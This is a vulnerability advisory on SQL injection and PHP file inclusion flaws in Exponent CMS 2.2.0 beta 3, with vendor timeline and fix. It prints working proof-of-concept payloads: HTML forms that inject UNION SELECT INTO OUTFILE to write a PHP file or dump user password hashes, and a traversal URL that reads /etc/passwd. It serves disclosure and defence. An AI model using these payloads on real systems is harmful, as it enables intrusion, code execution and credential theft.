Vendor: Online Innovative Creations
Vulnerable Version(s): 2.2.0 beta 3 and probably prior
Tested Version: 2.2.0 beta 3
Vendor Notification: April 24, 2013 
Vendor Patch: May 3, 2013 
Public Disclosure: May 15, 2013 
Vulnerability Type: SQL Injection [CWE-89], PHP File Inclusion [CWE-98]
CVE References: CVE-2013-3294, CVE-2013-3295
Risk Level: High 
CVSSv2 Base Scores: 7.5 (AV:N/AC:L/Au:N/C:P/I:P/A:P), 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C)
Solution Status: Fixed by Vendor
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge Security Research Lab discovered multiple vulnerabilities in Exponent CMS, which can be exploited to execute arbitrary SQL commands in the database of vulnerable application and execute arbitrary PHP code on the vulnerable system.


1) SQL Injection in Exponent CMS: CVE-2013-3294

The vulnerability exists due to insufficient filtration of "src" and "username" HTTP GET parameters passed to "/index.php" script. A remote unauthenticated attacker can execute arbitrary SQL commands in application&#039;s database.

Depending on database and system configuration, the PoC (Proof-of-Concept) code below will create a "/var/www/file.php" file with PHP function &#039;phpinfo()&#039;:


<form action="http://[host]/index.php" method="post" name="main">
<input type="hidden" name="action"   value="login">
<input type="hidden" name="int"      value="1">
<input type="hidden" name="module"   value="login">
<input type="hidden" name="password" value="password">
<input type="hidden" name="src"      value="&#039; UNION SELECT &#039;<? phpinfo(); ?>&#039; INTO OUTFILE &#039;/var/www/file.php&#039; -- ">
<input type="hidden" name="username" value="&#039; UNION SELECT &#039;<? phpinfo(); ?>&#039; INTO OUTFILE &#039;/var/www/file.php&#039; -- ">
<input type="submit" id="btn">
</form>


The second PoC will attempt to create "/var/www/file.txt" file, containing usernames and hashed passwords of all application&#039;s users: 


<form action="http://[host]/index.php" method="post" name="main">
<input type="hidden" name="action"   value="login">
<input type="hidden" name="int"      value="1">
<input type="hidden" name="module"   value="login">
<input type="hidden" name="password" value="password">
<input type="hidden" name="src"      value="&#039; UNION SELECT CONCAT_WS(&#039;:&#039;,username,password) FROM `exponent_user` INTO OUTFILE &#039;/var/www/file.txt&#039; -- ">
<input type="hidden" name="username" value="&#039; UNION SELECT CONCAT_WS(&#039;:&#039;,username,password) FROM `exponent_user` INTO OUTFILE &#039;/var/www/file.txt&#039; -- ">
<input type="submit" id="btn">
</form>



2) PHP File Inclusion in Exponent CMS: CVE-2013-3295

The vulnerability is caused by improper filtration of user-supplied input passed via the "page" HTTP GET parameter to "/install/popup.php" script, which is publicly accessible after CMS installation by default. A remote unauthenticated attacker can include arbitrary PHP files from the local system using directory traversal sequences with URL-encoded NULL byte, read arbitrary files or execute arbitrary PHP code on the target system. 

The PoC code below will output the content of &#039;/etc/passwd&#039; file on vulnerable system:

http://[host]/install/popup.php?page=../../../../etc/passwd%00

-----------------------------------------------------------------------------------------------

Solution:

Upgrade to Exponent CMS v2.2.0 Release Candidate 1

More Information:
http://www.exponentcms.org/news/release-candidate-1-v2-2-0-set-loose
http://forums.exponentcms.org/viewtopic.php?f=16&t=789

